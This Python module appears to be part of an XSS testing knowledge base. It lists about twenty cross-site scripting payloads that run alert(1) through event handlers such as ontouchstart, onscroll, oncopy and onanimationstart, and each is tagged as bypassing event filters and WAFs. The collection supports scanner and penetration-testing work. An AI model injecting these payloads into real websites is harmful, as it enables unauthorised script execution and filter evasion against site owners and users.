#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Truly Last XSS Payloads - Part 2
Touch events, Wheel events, Scroll events, Resize events, Fullscreen events, Clipboard events, Visibility events, WebKit fullscreen, and Animation/Transition events.
"""

from ..models import PayloadEntry


BRS_KB_TRULY_LAST_PAYLOADS_PART2 = {
    # ============================================================
    # TOUCH EVENTS
    # ============================================================
    "touch-ontouchstart": PayloadEntry(
        payload='<div ontouchstart="alert(1)">touch</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Touch start event",
        tags=["touch", "touchstart"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "touch-ontouchend": PayloadEntry(
        payload='<div ontouchend="alert(1)">touch</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Touch end event",
        tags=["touch", "touchend"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "touch-ontouchmove": PayloadEntry(
        payload='<div ontouchmove="alert(1)">move</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Touch move event",
        tags=["touch", "touchmove"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    "touch-ontouchcancel": PayloadEntry(
        payload='<div ontouchcancel="alert(1)">cancel</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Touch cancel event",
        tags=["touch", "touchcancel"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="medium",
    ),
    # ============================================================
    # WHEEL EVENTS
    # ============================================================
    "wheel-onwheel": PayloadEntry(
        payload='<div onwheel="alert(1)" style="height:100px;overflow:scroll">scroll wheel</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Wheel event",
        tags=["wheel", "onwheel"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "wheel-onmousewheel": PayloadEntry(
        payload='<div onmousewheel="alert(1)" style="height:100px;overflow:scroll">mouse wheel</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Mouse wheel event (legacy)",
        tags=["wheel", "mousewheel"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SCROLL EVENTS
    # ============================================================
    "scroll-onscroll": PayloadEntry(
        payload='<div onscroll="alert(1)" style="height:50px;overflow:scroll"><div style="height:100px">scroll</div></div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Scroll event",
        tags=["scroll", "onscroll"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "scroll-onscrollend": PayloadEntry(
        payload='<div onscrollend="alert(1)" style="height:50px;overflow:scroll"><div style="height:100px">scroll</div></div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Scroll end event (new)",
        tags=["scroll", "scrollend"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox"],
        reliability="high",
    ),
    # ============================================================
    # RESIZE EVENTS
    # ============================================================
    "resize-onresize": PayloadEntry(
        payload='<body onresize="alert(1)">',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Body resize event",
        tags=["resize", "body"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # FULLSCREEN EVENTS
    # ============================================================
    "fullscreen-onfullscreenchange": PayloadEntry(
        payload='<div onfullscreenchange="alert(1)">fullscreen</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Fullscreen change event",
        tags=["fullscreen", "change"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "fullscreen-onfullscreenerror": PayloadEntry(
        payload='<div onfullscreenerror="alert(1)">fullscreen error</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Fullscreen error event",
        tags=["fullscreen", "error"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # CLIPBOARD EVENTS (DOCUMENT)
    # ============================================================
    "clipboard-document-oncopy": PayloadEntry(
        payload="document.oncopy=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Document copy event",
        tags=["clipboard", "copy"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "clipboard-document-onpaste": PayloadEntry(
        payload="document.onpaste=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Document paste event",
        tags=["clipboard", "paste"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "clipboard-document-oncut": PayloadEntry(
        payload="document.oncut=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Document cut event",
        tags=["clipboard", "cut"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # VISIBILITY EVENTS
    # ============================================================
    "visibility-onvisibilitychange": PayloadEntry(
        payload="document.onvisibilitychange=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Visibility change event",
        tags=["visibility", "change"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # WEBKITFUL SCREEN (WEBKIT)
    # ============================================================
    "webkit-onwebkitfullscreenchange": PayloadEntry(
        payload="document.onwebkitfullscreenchange=()=>alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="WebKit fullscreen change",
        tags=["webkit", "fullscreen"],
        bypasses=["webkit_filters"],
        waf_evasion=True,
        browser_support=["chrome", "safari"],
        reliability="medium",
    ),
    # ============================================================
    # ANIMATION/TRANSITION EVENTS (MORE)
    # ============================================================
    "anim-onanimationstart": PayloadEntry(
        payload='<style>@keyframes x{from{opacity:1}to{opacity:0}}</style><div style="animation:x 1s" onanimationstart="alert(1)">anim</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Animation start event",
        tags=["animation", "start"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "anim-onanimationiteration": PayloadEntry(
        payload='<style>@keyframes x{from{opacity:1}to{opacity:0}}</style><div style="animation:x 0.1s infinite" onanimationiteration="alert(1)">anim</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Animation iteration event",
        tags=["animation", "iteration"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "anim-onanimationcancel": PayloadEntry(
        payload='<div onanimationcancel="alert(1)">cancel</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Animation cancel event",
        tags=["animation", "cancel"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "trans-ontransitionstart": PayloadEntry(
        payload='<div style="transition:all 1s" ontransitionstart="alert(1)">trans</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Transition start event",
        tags=["transition", "start"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "trans-ontransitionrun": PayloadEntry(
        payload='<div style="transition:all 1s" ontransitionrun="alert(1)">trans</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Transition run event",
        tags=["transition", "run"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "trans-ontransitioncancel": PayloadEntry(
        payload='<div ontransitioncancel="alert(1)">cancel</div>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Transition cancel event",
        tags=["transition", "cancel"],
        bypasses=["event_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
}
